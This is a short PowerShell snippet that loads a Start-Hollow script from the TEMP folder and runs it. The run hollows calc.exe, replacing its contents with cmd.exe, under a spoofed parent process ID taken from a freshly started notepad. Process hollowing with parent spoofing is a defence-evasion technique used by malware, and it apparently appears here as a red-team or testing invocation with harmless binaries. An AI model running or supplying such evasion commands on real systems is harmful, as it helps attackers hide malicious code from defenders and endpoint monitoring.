.$env:TEMP\Start-Hollow.ps1
$ppid=(Start-Process notepad -PassThru).id
Start-Hollow -Sponsor "C:\Windows\System32\calc.exe" -Hollow "C:\Windows\System32\cmd.exe" -ParentPID $ppid -Verbose